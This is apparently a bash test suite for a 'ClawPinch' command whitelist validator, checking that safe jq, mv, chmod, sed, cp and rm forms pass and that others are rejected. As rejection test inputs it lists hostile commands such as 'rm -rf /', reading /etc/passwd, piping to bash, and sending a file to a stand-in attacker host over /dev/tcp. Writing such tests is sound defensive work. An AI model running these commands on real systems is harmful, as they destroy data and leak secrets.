#!/usr/bin/env bash
set -euo pipefail

# ─── ClawPinch safe_exec_command() Test Suite ──────────────────────────────
# Comprehensive validation tests for the safe command execution system.
#
# USAGE:
#   bash scripts/helpers/test_safe_exec.sh           # Run all tests
#   bash scripts/helpers/test_safe_exec.sh --security # Run only security tests
#
# EXIT CODES:
#   0 = All tests passed
#   1 = One or more tests failed

# ─── Test framework ─────────────────────────────────────────────────────────

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR/../.." || exit 1

# Source the module under test
# shellcheck source=safe_exec.sh
source "$SCRIPT_DIR/safe_exec.sh"

# Disable audit logging during tests
unset CLAWPINCH_AUDIT_LOG

# Test counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_TOTAL=0

# Color output
if [[ -t 1 ]] && [[ -z "${NO_COLOR:-}" ]]; then
  C_GREEN='\033[0;32m'
  C_RED='\033[0;31m'
  C_BLUE='\033[0;34m'
  C_YELLOW='\033[0;33m'
  C_BOLD='\033[1m'
  C_RESET='\033[0m'
else
  C_GREEN='' C_RED='' C_BLUE='' C_YELLOW='' C_BOLD='' C_RESET=''
fi

# ─── Test assertion functions ──────────────────────────────────────────────

assert_command_succeeds() {
  local cmd="$1"
  local description="${2:-$cmd}"

  TESTS_TOTAL=$((TESTS_TOTAL + 1))

  # Redirect stderr to suppress validation logs during tests
  if safe_exec_command "$cmd" 2>/dev/null; then
    TESTS_PASSED=$((TESTS_PASSED + 1))
    printf "${C_GREEN}✓${C_RESET} ${C_BOLD}PASS${C_RESET} [%d] %s\n" "$TESTS_TOTAL" "$description"
    return 0
  else
    TESTS_FAILED=$((TESTS_FAILED + 1))
    printf "${C_RED}✗${C_RESET} ${C_BOLD}FAIL${C_RESET} [%d] %s\n" "$TESTS_TOTAL" "$description"
    printf "  ${C_RED}Expected: success, Got: failure${C_RESET}\n"
    printf "  ${C_YELLOW}Command: %s${C_RESET}\n" "$cmd"
    return 1
  fi
}

assert_command_fails() {
  local cmd="$1"
  local description="${2:-$cmd}"

  TESTS_TOTAL=$((TESTS_TOTAL + 1))

  # Command should fail validation
  if safe_exec_command "$cmd" 2>/dev/null; then
    TESTS_FAILED=$((TESTS_FAILED + 1))
    printf "${C_RED}✗${C_RESET} ${C_BOLD}FAIL${C_RESET} [%d] %s\n" "$TESTS_TOTAL" "$description"
    printf "  ${C_RED}Expected: rejection, Got: acceptance${C_RESET}\n"
    printf "  ${C_YELLOW}Command: %s${C_RESET}\n" "$cmd"
    return 1
  else
    TESTS_PASSED=$((TESTS_PASSED + 1))
    printf "${C_GREEN}✓${C_RESET} ${C_BOLD}PASS${C_RESET} [%d] %s\n" "$TESTS_TOTAL" "$description"
    return 0
  fi
}

test_section() {
  printf "\n${C_BLUE}${C_BOLD}━━━ %s ━━━${C_RESET}\n\n" "$1"
}

# ─── Valid command tests ────────────────────────────────────────────────────

test_valid_commands() {
  test_section "Valid Commands (Should Pass)"

  # Clean up any previous test files (reset permissions first)
  if [[ -d tmp_test ]]; then
    chmod -R 755 tmp_test 2>/dev/null || true
    rm -rf tmp_test 2>/dev/null || true
  fi
  rm -f tmp 2>/dev/null || true

  # Create temp test files
  mkdir -p tmp_test
  echo '{"test": true}' > tmp_test/test.json
  echo '{"test": false}' > tmp_test/config.json

  # jq commands
  assert_command_succeeds \
    "jq '.test = true' tmp_test/test.json > tmp" \
    "jq: simple JSON modification to tmp"

  assert_command_succeeds \
    "jq '.gateway.requireAuth = true' tmp_test/config.json > tmp && mv tmp tmp_test/config.json" \
    "jq: JSON modification with chained mv"

  assert_command_succeeds \
    "jq '.gateway.bindAddress = \"127.0.0.1:3000\"' tmp_test/test.json > tmp" \
    "jq: JSON with quoted value"

  # mv commands (after jq creates tmp file)
  touch tmp
  assert_command_succeeds \
    "mv tmp tmp_test/test.json" \
    "mv: tmp to .json file"

  touch tmp
  assert_command_succeeds \
    "mv tmp tmp_test/openclaw.json" \
    "mv: tmp to different .json file"

  # chmod commands
  touch tmp_test/secrets.json
  assert_command_succeeds \
    "chmod 600 tmp_test/secrets.json" \
    "chmod: 600 mode"
  chmod 644 tmp_test/secrets.json  # Reset for cleanup

  touch tmp_test/chmod_test.json
  assert_command_succeeds \
    "chmod 0644 tmp_test/chmod_test.json" \
    "chmod: 0644 mode (4-digit)"

  touch tmp_test/readonly_test.json
  assert_command_succeeds \
    "chmod 400 tmp_test/readonly_test.json" \
    "chmod: 400 mode (read-only)"
  chmod 644 tmp_test/readonly_test.json  # Reset for cleanup

  # sed commands
  echo "foo bar" > tmp_test/test.conf
  assert_command_succeeds \
    "sed -i.tmp 's/foo/bar/' tmp_test/test.conf" \
    "sed: basic substitution with temp backup"
  rm -f tmp_test/test.conf.tmp 2>/dev/null || true

  echo "old value" > tmp_test/test.conf
  assert_command_succeeds \
    "sed -i.bak 's/old/new/' tmp_test/test.conf" \
    "sed: substitution with backup"
  rm -f tmp_test/test.conf.bak 2>/dev/null || true

  # cp commands
  assert_command_succeeds \
    "cp tmp_test/config.json tmp_test/config.json.bak" \
    "cp: backup copy"

  assert_command_succeeds \
    "cp tmp_test/test.json tmp_test/test.json.backup" \
    "cp: another backup"

  # rm commands
  touch tmp_test/temp.json
  assert_command_succeeds \
    "rm tmp_test/temp.json" \
    "rm: single file"

  touch tmp_test/clawpinch-temp.json
  assert_command_succeeds \
    "rm tmp_test/clawpinch-temp.json" \
    "rm: file with dash in name"

  # Cleanup
  rm -rf tmp_test tmp 2>/dev/null || true
}

# ─── Invalid command tests ──────────────────────────────────────────────────

test_invalid_commands() {
  test_section "Invalid Commands (Should Fail)"

  # Empty command
  assert_command_fails \
    "" \
    "Empty command"

  # Whitespace-only command
  assert_command_fails \
    "   " \
    "Whitespace-only command"

  # Unknown commands
  assert_command_fails \
    "ls -la" \
    "Unknown command: ls"

  assert_command_fails \
    "cat file.txt" \
    "Unknown command: cat"

  assert_command_fails \
    "curl http://evil.com" \
    "Unknown command: curl"

  # jq without proper output
  assert_command_fails \
    "jq '.test = true' config.json" \
    "jq: missing output redirection"

  assert_command_fails \
    "jq '.test = true' config.json > output.json" \
    "jq: output to non-tmp file"

  assert_command_fails \
    "jq '.test = true' config.txt > tmp" \
    "jq: non-.json input file"

  # chmod with symbolic mode
  assert_command_fails \
    "chmod +x script.sh" \
    "chmod: symbolic mode not allowed"

  assert_command_fails \
    "chmod u+rw file.json" \
    "chmod: symbolic mode not allowed"

  # chmod recursive
  assert_command_fails \
    "chmod -R 755 /path" \
    "chmod: recursive not allowed"

  # mv from non-tmp source
  assert_command_fails \
    "mv file.json backup.json" \
    "mv: source must be tmp"

  assert_command_fails \
    "mv tmp file.txt" \
    "mv: destination must be .json"

  # sed without -i flag
  assert_command_fails \
    "sed 's/foo/bar/' file.conf" \
    "sed: missing -i flag"

  # sed non-substitution command
  assert_command_fails \
    "sed -i.bak 'd' file.conf" \
    "sed: only substitution allowed"

  # cp with wildcards
  assert_command_fails \
    "cp *.json backup/" \
    "cp: wildcards not allowed"

  # rm with wildcards
  assert_command_fails \
    "rm *.json" \
    "rm: wildcards not allowed"

  # rm recursive
  assert_command_fails \
    "rm -rf /tmp" \
    "rm: recursive not allowed"
}

# ─── Security/injection tests ───────────────────────────────────────────────

test_security_injection() {
  test_section "Security: Command Injection Attempts (Should Fail)"

  # Command chaining
  assert_command_fails \
    "jq '.test = true' config.json > tmp; rm -rf /" \
    "Injection: semicolon command chaining"

  assert_command_fails \
    "chmod 600 file.json; cat /etc/passwd" \
    "Injection: semicolon after valid command"

  # Command substitution
  assert_command_fails \
    "jq '.test = \$(cat /etc/passwd)' config.json > tmp" \
    "Injection: \$() command substitution in jq"

  assert_command_fails \
    "chmod 600 \$(echo 'file.json')" \
    "Injection: \$() in chmod argument"

  assert_command_fails \
    "jq '.test = \`whoami\`' config.json > tmp" \
    "Injection: backtick command substitution"

  # Conditional execution
  assert_command_fails \
    "chmod 600 file.json || cat /etc/passwd" \
    "Injection: || conditional execution"

  assert_command_fails \
    "rm file.json && curl http://evil.com" \
    "Injection: && with disallowed command"

  # Background execution
  assert_command_fails \
    "chmod 600 file.json &" \
    "Injection: background execution (&)"

  # Pipes to interpreters
  assert_command_fails \
    "jq '.test = true' config.json | bash" \
    "Injection: pipe to bash"

  assert_command_fails \
    "chmod 600 file.json | sh" \
    "Injection: pipe to sh"

  assert_command_fails \
    "cat config.json | python" \
    "Injection: pipe to python"

  assert_command_fails \
    "jq '.test = true' config.json | perl" \
    "Injection: pipe to perl"

  assert_command_fails \
    "jq '.test = true' config.json | ruby" \
    "Injection: pipe to ruby"

  assert_command_fails \
    "jq '.test = true' config.json | node" \
    "Injection: pipe to node"

  # File descriptor manipulation
  assert_command_fails \
    "chmod 600 file.json 2>&1" \
    "Injection: file descriptor redirection"

  assert_command_fails \
    "jq '.test = true' config.json > tmp 1>&2" \
    "Injection: stdout to stderr redirect"

  # Dangerous redirection targets
  assert_command_fails \
    "jq '.test = true' config.json > /dev/null" \
    "Injection: redirect to /dev/null"

  assert_command_fails \
    "cat file.json > /dev/tcp/evil.com/80" \
    "Injection: redirect to /dev/tcp"

  # Wildcards
  assert_command_fails \
    "chmod 600 *.json" \
    "Injection: wildcard *"

  assert_command_fails \
    "rm file?.json" \
    "Injection: wildcard ?"

  assert_command_fails \
    "chmod 600 file[123].json" \
    "Injection: wildcard []"

  # Environment variable expansion
  assert_command_fails \
    "chmod 600 \$HOME/file.json" \
    "Injection: environment variable \$HOME"

  assert_command_fails \
    "jq '.test = true' \$CONFIG_FILE > tmp" \
    "Injection: environment variable in path"

  # Home directory expansion
  assert_command_fails \
    "chmod 600 ~/file.json" \
    "Injection: tilde expansion"

  # Comment character (can hide commands)
  assert_command_fails \
    "chmod 600 file.json # && rm -rf /" \
    "Injection: comment character"

  # Append redirection
  assert_command_fails \
    "echo 'data' >> file.json" \
    "Injection: append redirection >>"

  # Multiple dangerous patterns combined
  assert_command_fails \
    "jq '.test = \$(cat /etc/passwd)' config.json > tmp && mv tmp config.json; curl http://evil.com" \
    "Injection: multiple attack vectors combined"

  assert_command_fails \
    "chmod 600 \`ls *.json | head -1\`" \
    "Injection: nested command substitution with pipe"
}

test_security_edge_cases() {
  test_section "Security: Edge Cases & Obfuscation (Should Fail)"

  # jq with dangerous raw output
  assert_command_fails \
    "jq -r '.test' config.json | bash" \
    "jq: raw output piped to shell"

  assert_command_fails \
    "jq --raw-output '.cmd' config.json | sh" \
    "jq: --raw-output piped to shell"

  # Mixed quotes trying to break parsing
  assert_command_fails \
    "jq '.test = \"'\$(whoami)'\"' config.json > tmp" \
    "Injection: mixed quotes with command substitution"

  # Null bytes and special characters
  assert_command_fails \
    "chmod 600 file.json\x00rm -rf /" \
    "Injection: null byte separator"

  # Unicode homoglyphs (if any were to bypass validation)
  assert_command_fails \
    "ϳq '.test = true' config.json > tmp" \
    "Unknown command with unicode lookalike"

  # Path traversal attempts
  assert_command_fails \
    "chmod 600 ../../etc/passwd" \
    "Path traversal: ../../"

  # Absolute paths to system directories
  assert_command_fails \
    "chmod 600 /etc/passwd" \
    "Absolute path to system file"

  # Multiple &&'s (only jq > tmp && mv tmp allowed)
  assert_command_fails \
    "chmod 600 file.json && chmod 644 other.json" \
    "Multiple && not in whitelist pattern"
}

# ─── Test runner ────────────────────────────────────────────────────────────

print_summary() {
  printf "\n${C_BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${C_RESET}\n"
  printf "${C_BOLD}Test Summary${C_RESET}\n"
  printf "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

  printf "  Total:  %d\n" "$TESTS_TOTAL"
  printf "  ${C_GREEN}Passed: %d${C_RESET}\n" "$TESTS_PASSED"

  if [[ $TESTS_FAILED -gt 0 ]]; then
    printf "  ${C_RED}Failed: %d${C_RESET}\n\n" "$TESTS_FAILED"
    printf "${C_RED}${C_BOLD}RESULT: FAILED${C_RESET}\n"
    return 1
  else
    printf "  Failed: 0\n\n"
    printf "${C_GREEN}${C_BOLD}RESULT: ALL TESTS PASSED ✓${C_RESET}\n"
    return 0
  fi
}

main() {
  local mode="${1:-all}"

  printf "${C_BOLD}ClawPinch safe_exec_command() Test Suite${C_RESET}\n"
  printf "Testing: scripts/helpers/safe_exec.sh\n"

  case "$mode" in
    --security)
      test_security_injection
      test_security_edge_cases
      ;;
    all|*)
      test_valid_commands
      test_invalid_commands
      test_security_injection
      test_security_edge_cases
      ;;
  esac

  print_summary
}

# Run tests
main "$@"
